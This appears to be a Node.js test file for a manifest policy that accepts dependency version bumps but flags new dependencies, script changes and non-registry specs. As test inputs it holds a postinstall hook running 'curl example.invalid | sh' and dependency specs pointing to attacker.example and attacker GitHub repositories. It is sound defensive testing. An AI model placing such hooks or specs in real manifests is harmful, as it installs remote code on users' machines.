import { test } from 'node:test';
import assert from 'node:assert/strict';
import { manifestChanges } from './manifest-policy.mjs';

const base = {
  name: '@alparts/server',
  scripts: { test: 'node --test' },
  dependencies: { express: '5.2.0', zod: '^4.1.0' },
  devDependencies: { vitest: '5.0.0' },
};

test('version changes and removals of existing dependencies are allowed', () => {
  const after = {
    ...base,
    dependencies: { express: '5.3.0' },
    devDependencies: { vitest: '5.0.1' },
  };
  const { changes, violations } = manifestChanges(base, after);
  assert.deepEqual(violations, []);
  assert.deepEqual(changes, [
    { section: 'dependencies', name: 'express', from: '5.2.0', to: '5.3.0' },
    { section: 'dependencies', name: 'zod', from: '^4.1.0', to: null },
    { section: 'devDependencies', name: 'vitest', from: '5.0.0', to: '5.0.1' },
  ]);
});

test('new dependencies and other fields are refused', () => {
  const after = {
    ...base,
    scripts: { test: 'node --test', postinstall: 'curl example.invalid | sh' },
    dependencies: { ...base.dependencies, 'left-pad': '1.3.0' },
    pnpm: { overrides: { qs: '6.0.0' } },
  };
  const { violations } = manifestChanges(base, after);
  assert.deepEqual(violations.sort(), ['"pnpm" changed', '"scripts" changed', 'dependencies.left-pad added']);
});

test('moving a dependency to another section counts as adding it', () => {
  const after = { ...base, dependencies: { zod: '^4.1.0' }, devDependencies: { ...base.devDependencies, express: '5.2.0' } };
  assert.deepEqual(manifestChanges(base, after).violations, ['devDependencies.express added']);
});

test('an unchanged manifest has no changes', () => {
  assert.deepEqual(manifestChanges(base, structuredClone(base)), { changes: [], violations: [] });
});

test('a dependency can move only to a registry version', () => {
  for (const spec of [
    'https://attacker.example/express.tgz',
    'npm:attacker-package@5.3.0',
    'github:attacker/express#main',
    'git+https://github.com/attacker/express.git',
    'file:../express',
    'link:../express',
    'workspace:*',
    'latest',
    '*',
    '>=5.2.0',
    '5.x',
    5,
    { version: '5.3.0' },
  ]) {
    const { changes, violations } = manifestChanges(base, { ...base, dependencies: { ...base.dependencies, express: spec } });
    assert.deepEqual(changes, [], JSON.stringify(spec));
    assert.deepEqual(violations, [`dependencies.express set to ${JSON.stringify(spec)}, which is not a version`]);
  }
});

test('a dependency that is not a registry version cannot change or be removed', () => {
  const workspace = { ...base, dependencies: { ...base.dependencies, '@alparts/shared': 'workspace:*' } };
  const violation = ['dependencies.@alparts/shared is "workspace:*", which only a person may change'];
  assert.deepEqual(manifestChanges(workspace, { ...workspace, dependencies: { ...workspace.dependencies, '@alparts/shared': '1.0.0' } }).violations, violation);
  assert.deepEqual(manifestChanges(workspace, base).violations, violation);
});

test('a dependency section must stay an object, and inherited names are not dependencies', () => {
  assert.deepEqual(manifestChanges(base, { ...base, dependencies: [] }).violations, ['"dependencies" is not an object']);
  const inherited = JSON.parse('{"express":"5.2.0","zod":"^4.1.0","constructor":"1.0.0"}');
  assert.deepEqual(manifestChanges(base, { ...base, dependencies: inherited }).violations, ['dependencies.constructor added']);
});
